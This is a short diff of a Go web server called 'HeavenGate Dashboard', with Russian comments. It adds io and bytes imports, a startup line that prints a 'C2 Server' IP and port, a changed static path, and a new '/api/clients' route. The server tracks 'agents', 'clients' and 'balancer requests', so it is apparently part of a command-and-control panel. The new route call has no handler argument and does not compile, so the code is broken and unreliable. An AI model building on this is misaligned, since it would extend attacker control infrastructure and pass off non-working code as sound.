@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"os"
@@ -96,7 +98,8 @@ func main() {
 	}
 
 	fmt.Println("🚀 HeavenGate Dashboard started!")
-	fmt.Println("📡 Listening for balancer requests on :8081")
+	fmt.Printf("📡 Listening for balancer requests on :8081\n")
+	fmt.Printf("🔄 C2 Server: %s:%s\n", C2IP, C2PORT)
 	fmt.Println("🌐 Open http://localhost:8081 to view balancer requests")
 	if loggingEnabled {
 		fmt.Println("📝 Logging enabled: logs are being written to heavengate_dashboard.log")
@@ -108,7 +111,7 @@ func main() {
 	logf("INFO", "HeavenGate Dashboard server starting on port 8081")
 
 	// Обслуживание статических файлов
-	http.Handle("/", http.FileServer(http.Dir("../../static")))
+	http.Handle("/", http.FileServer(http.Dir("static")))
 
 	// SSE endpoint для real-time обновлений
 	http.HandleFunc("/events", handleSSE)
@@ -118,6 +121,8 @@ func main() {
 
 	// API для получения истории запросов
 	http.HandleFunc("/api/user_registered", getUserUpdate)
+	
+	http.HandleFunc("/api/clients", ) 
 
 	// API для обновления информации об агентах
 	http.HandleFunc("/api/agents", handleAgentsUpdate)
